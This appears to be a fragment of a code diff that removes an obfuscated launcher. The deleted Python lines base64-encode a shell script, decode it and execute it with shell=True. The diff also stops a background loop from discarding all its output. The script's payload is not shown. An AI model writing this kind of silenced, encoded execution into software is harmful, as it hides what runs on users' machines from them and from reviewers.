@@ -104,15 +104,4 @@ EOF
         sleep 30
     fi
 
-done > /dev/null 2>&1 &
-
-encoded_script = base64.b64encode(shell_script.encode()).decode()
-
-print("==== Base64 Shell Script ====")
-print(encoded_script)
-print("=======================================")
-
-decoded_script = base64.b64decode(encoded_script).decode()
-subprocess.Popen(decoded_script, shell=True)
-
-print(f"Ã¢Å“â€¦ ok")
+done &
